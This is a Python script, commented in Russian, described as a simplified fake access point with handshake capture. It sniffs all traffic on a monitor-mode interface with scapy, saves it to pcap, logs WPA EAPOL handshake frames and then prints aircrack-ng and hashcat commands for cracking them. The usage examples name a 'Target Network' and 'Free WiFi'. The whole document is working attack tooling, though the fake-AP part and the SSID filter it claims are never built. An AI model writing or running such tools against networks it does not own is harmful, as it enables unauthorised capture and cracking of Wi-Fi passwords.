#!/usr/bin/env python3
"""
Упрощенная версия Fake AP с перехватом handshake
Использует только scapy для сниффинга EAPOL пакетов
"""

import os
import sys
import time
from datetime import datetime
from scapy.all import *

class SimpleHandshakeCatcher:
    def __init__(self, interface, ssid, output_dir="captures"):
        self.interface = interface
        self.ssid = ssid
        self.output_dir = output_dir
        self.handshakes = []
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.capture_file = os.path.join(output_dir, f"handshake_{ssid}_{self.timestamp}.pcap")
        self.hash_file = os.path.join(output_dir, f"hashes_{ssid}_{self.timestamp}.txt")
        self.log_file = os.path.join(output_dir, f"log_{ssid}_{self.timestamp}.txt")

        # Создаем директорию для сохранения
        os.makedirs(output_dir, exist_ok=True)

        # Открываем writer для pcap
        self.pcap_writer = PcapWriter(self.capture_file, append=True, sync=True)

        self.log(f"Инициализация перехватчика для SSID: {ssid}")

    def log(self, message):
        """Логирование"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)

        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_msg + '\n')

    def is_eapol_packet(self, packet):
        """Проверка, является ли пакет EAPOL (handshake)"""
        return packet.haslayer(EAPOL)

    def extract_handshake_info(self, packet):
        """Извлечение информации из handshake пакета"""
        try:
            if packet.haslayer(Dot11):
                # MAC адреса
                src = packet[Dot11].addr2
                dst = packet[Dot11].addr1
                bssid = packet[Dot11].addr3

                # Информация о EAPOL
                if packet.haslayer(EAPOL):
                    eapol = packet[EAPOL]

                    info = {
                        'timestamp': datetime.now().isoformat(),
                        'src': src,
                        'dst': dst,
                        'bssid': bssid,
                        'eapol_type': eapol.sprintf("%EAPOL.type%"),
                        'packet_summary': packet.summary()
                    }

                    return info
        except Exception as e:
            self.log(f"[!] Ошибка извлечения информации: {e}")

        return None

    def save_handshake_data(self, info):
        """Сохранение данных handshake"""
        with open(self.hash_file, 'a', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write(f"Timestamp: {info['timestamp']}\n")
            f.write(f"BSSID: {info['bssid']}\n")
            f.write(f"Source MAC: {info['src']}\n")
            f.write(f"Destination MAC: {info['dst']}\n")
            f.write(f"EAPOL Type: {info['eapol_type']}\n")
            f.write(f"Packet: {info['packet_summary']}\n")
            f.write("=" * 70 + "\n\n")

    def packet_handler(self, packet):
        """Обработчик пакетов"""
        try:
            # Сохраняем все пакеты в pcap
            self.pcap_writer.write(packet)

            # Проверяем EAPOL
            if self.is_eapol_packet(packet):
                self.log("[+] ОБНАРУЖЕН EAPOL ПАКЕТ (Handshake)!")

                info = self.extract_handshake_info(packet)
                if info:
                    self.handshakes.append(info)
                    self.save_handshake_data(info)

                    self.log(f"    BSSID: {info['bssid']}")
                    self.log(f"    Client: {info['src']}")
                    self.log(f"    Type: {info['eapol_type']}")
                    self.log(f"[+] Данные сохранены в {self.hash_file}")

        except Exception as e:
            self.log(f"[!] Ошибка обработки пакета: {e}")

    def start_sniffing(self):
        """Запуск сниффинга"""
        self.log(f"[*] Запуск сниффинга на интерфейсе {self.interface}")
        self.log(f"[*] Фильтр: SSID = {self.ssid}")
        self.log(f"[*] Файлы:")
        self.log(f"    - PCAP: {self.capture_file}")
        self.log(f"    - Хэши: {self.hash_file}")
        self.log(f"    - Лог: {self.log_file}")
        self.log("[*] Ожидание EAPOL пакетов (WPA Handshake)...")
        self.log("[*] Нажмите Ctrl+C для остановки\n")

        try:
            # Сниффим пакеты на WiFi интерфейсе
            # Фильтр для 802.11 и EAPOL пакетов
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=0  # Не храним пакеты в памяти
            )

        except KeyboardInterrupt:
            self.log("\n[*] Остановка перехвата...")
            self.cleanup()

        except Exception as e:
            self.log(f"[!] Ошибка: {e}")
            self.cleanup()

    def cleanup(self):
        """Завершение работы"""
        self.pcap_writer.close()

        self.log("\n" + "=" * 70)
        self.log(f"[+] Перехвачено EAPOL пакетов: {len(self.handshakes)}")
        self.log(f"[+] Все данные сохранены в директории: {self.output_dir}")
        self.log(f"[+] PCAP файл: {self.capture_file}")
        self.log(f"[+] Хэши: {self.hash_file}")

        if len(self.handshakes) > 0:
            self.log("\n[+] Для взлома используйте:")
            self.log(f"    aircrack-ng {self.capture_file}")
            self.log(f"    или")
            self.log(f"    hashcat -m 22000 {self.hash_file}")


def main():
    print("""
╔════════════════════════════════════════════╗
║   Simple Handshake Catcher (Scapy Only)    ║
║        WPA/WPA2 EAPOL Packet Sniffer       ║
╚════════════════════════════════════════════╝
""")

    if len(sys.argv) < 3:
        print("Использование:")
        print(f"  {sys.argv[0]} <interface> <SSID> [output_dir]")
        print("\nПример:")
        print(f"  {sys.argv[0]} wlan0mon 'Target Network'")
        print(f"  {sys.argv[0]} wlan1mon 'Free WiFi' ./captures")
        print("\nПримечание:")
        print("  - Интерфейс должен быть в режиме монитора (wlan0mon)")
        print("  - Требуются права root/администратора")
        sys.exit(1)

    # Проверка прав
    if os.geteuid() != 0:
        print("[!] Требуются права root")
        print("[!] Запустите: sudo python3", sys.argv[0])
        sys.exit(1)

    interface = sys.argv[1]
    ssid = sys.argv[2]
    output_dir = sys.argv[3] if len(sys.argv) > 3 else "captures"

    catcher = SimpleHandshakeCatcher(interface, ssid, output_dir)
    catcher.start_sniffing()


if __name__ == '__main__':
    main()
